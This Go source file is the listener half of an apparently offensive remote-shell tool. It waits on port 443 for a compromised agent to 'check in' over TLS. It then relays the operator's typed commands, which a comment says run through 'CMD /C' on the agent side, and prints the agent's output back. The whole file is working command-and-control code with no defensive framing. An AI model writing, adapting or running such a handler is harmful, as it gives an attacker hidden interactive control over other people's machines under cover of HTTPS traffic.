// Generate key pair:  openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -days 7
//TODO: Build basic CLI
package main

import (
	"crypto/tls"
	"io"
	"log"
	"net"
	"os"
)

type transfer struct {
	bytes uint64
}

func main() {
	cer, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		log.Println(err)
		return
	}

	config := &tls.Config{Certificates: []tls.Certificate{cer}}
	ln, err := tls.Listen("tcp", "192.168.180.139:443", config)
	if err != nil {
		log.Println(err)
	}
	log.Println("Waiting for Check-in")
	conn, err := ln.Accept()
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Check-in from:[%s]!", conn.RemoteAddr())
	Streams(conn)
}

func Streams(conn net.Conn) {
	c := make(chan transfer) // create a channel and throw it transfer (struct as defined above)

	// Read from Reader and write to Writer until EOF
	copy := func(r io.ReadCloser, w io.WriteCloser) {
		defer func() {
			r.Close()
			w.Close()
		}()
		n, err := io.Copy(w, r)
		if err != nil {
			log.Printf("[%s]: ERROR: %s\n", conn.RemoteAddr(), err)
		}
		c <- transfer{bytes: uint64(n)} // this is the struct that was defined in the beginning - sends progress into a channel - VAR n = Copy r/w
	}

	go copy(conn, os.Stdout) // starts a go routine - copies con (accepted connection) to os.Stdout
	go copy(os.Stdin, conn)  // starts a go routine - copies os.Stdin to con - in this case "CMD /C" as defined on agent side

	p := <-c
	log.Printf("[%s]: Connection has been closed by remote peer, %d bytes has been receiv\n", conn.RemoteAddr(), p.bytes)
	p = <-c
	log.Printf("[%s]: Local peer has been stopped, %d bytes has been sent\n", conn.RemoteAddr(), p.bytes)
}
